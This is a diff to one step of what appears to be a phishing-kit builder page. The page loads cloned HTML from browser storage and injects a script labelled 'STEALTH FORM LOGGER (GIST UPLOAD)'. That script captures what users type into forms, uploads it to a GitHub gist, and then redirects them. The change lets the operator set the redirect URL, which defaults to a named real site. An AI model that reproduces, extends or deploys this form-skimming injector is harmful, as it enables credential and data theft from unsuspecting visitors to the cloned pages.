@@ -43,6 +43,20 @@
             background-color: #f2dede;
             color: #a94442;
         }
+        #redirectUrlInput {
+            width: 100%;
+            padding: 8px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .input-group {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -54,6 +68,12 @@
         
         <div id="userInfo" class="status"></div>
         
+        <div class="input-group">
+            <label for="redirectUrlInput">Enter redirect URL (after successful submission):</label>
+            <input type="text" id="redirectUrlInput" placeholder="https://www.example.com" value="https://www.dtech24.co.za">
+        </div>
+        
+        <button id="processBtn">Process HTML</button>
         <button id="nextBtn" style="display: none;">Proceed to Step 3</button>
     </div>
 
@@ -61,7 +81,9 @@
         document.addEventListener('DOMContentLoaded', function() {
             const statusEl = document.getElementById('status');
             const userInfoEl = document.getElementById('userInfo');
+            const processBtn = document.getElementById('processBtn');
             const nextBtn = document.getElementById('nextBtn');
+            const redirectUrlInput = document.getElementById('redirectUrlInput');
             
             // Check if data1step exists
             if (!localStorage.getItem('data1step')) {
@@ -88,11 +110,30 @@
                 Gist ID: ${userInfo.gistId || 'Not specified'}
             `;
             
-            // Get the HTML from data1step
-            let html = localStorage.getItem('data1step');
-            
-            // Inject the script just before closing body tag
-            const scriptToInject = `
+            // Handle process button click
+            processBtn.addEventListener('click', function() {
+                const redirectUrl = redirectUrlInput.value.trim();
+                
+                // Validate URL
+                if (!redirectUrl) {
+                    statusEl.textContent = 'Error: Please enter a redirect URL';
+                    statusEl.className = 'status error';
+                    return;
+                }
+                
+                try {
+                    new URL(redirectUrl); // This will throw if URL is invalid
+                } catch (e) {
+                    statusEl.textContent = 'Error: Please enter a valid URL (include http:// or https://)';
+                    statusEl.className = 'status error';
+                    return;
+                }
+                
+                // Get the HTML from data1step
+                let html = localStorage.getItem('data1step');
+                
+                // Inject the script just before closing body tag
+                const scriptToInject = `
 <!-- STEALTH FORM LOGGER (GIST UPLOAD) -->
 <script>
 // CONFIGURATION
@@ -190,8 +231,8 @@ const CONFIG = {
             });
 
             if (updateRes.ok) {
-                // Redirect to www.dtech24.co.za after successful upload
-                window.location.href = 'https://www.dtech24.co.za';
+                // Redirect to user-specified URL after successful upload
+                window.location.href = '${redirectUrl}';
             }
 
             return updateRes.ok;
@@ -261,27 +302,29 @@ const CONFIG = {
 })();
 <\/script>
 `;
+                
+                // Find the closing body tag and insert the script before it
+                const bodyCloseTagIndex = html.lastIndexOf('</body>');
+                if (bodyCloseTagIndex !== -1) {
+                    const modifiedHtml = html.slice(0, bodyCloseTagIndex) + scriptToInject + html.slice(bodyCloseTagIndex);
+                    
+                    // Save to data2step
+                    localStorage.setItem('data2step', modifiedHtml);
+                    
+                    statusEl.textContent = `Successfully processed HTML and injected script with redirect to ${redirectUrl}. Modified HTML saved to data2step in localStorage.`;
+                    statusEl.className = 'status success';
+                    processBtn.style.display = 'none';
+                    nextBtn.style.display = 'block';
+                } else {
+                    statusEl.textContent = 'Error: Could not find </body> tag in the HTML';
+                    statusEl.className = 'status error';
+                }
+            });
             
-            // Find the closing body tag and insert the script before it
-            const bodyCloseTagIndex = html.lastIndexOf('</body>');
-            if (bodyCloseTagIndex !== -1) {
-                const modifiedHtml = html.slice(0, bodyCloseTagIndex) + scriptToInject + html.slice(bodyCloseTagIndex);
-                
-                // Save to data2step
-                localStorage.setItem('data2step', modifiedHtml);
-                
-                statusEl.textContent = 'Successfully processed HTML and injected script. Modified HTML saved to data2step in localStorage.';
-                statusEl.className = 'status success';
-                nextBtn.style.display = 'block';
-            } else {
-                statusEl.textContent = 'Error: Could not find </body> tag in the HTML';
-                statusEl.className = 'status error';
-            }
-        });
-        
-        // Handle next button click
-        document.getElementById('nextBtn').addEventListener('click', function() {
-            window.location.href = 'step3.html';
+            // Handle next button click
+            nextBtn.addEventListener('click', function() {
+                window.location.href = 'step3.html';
+            });
         });
     </script>
 </body>
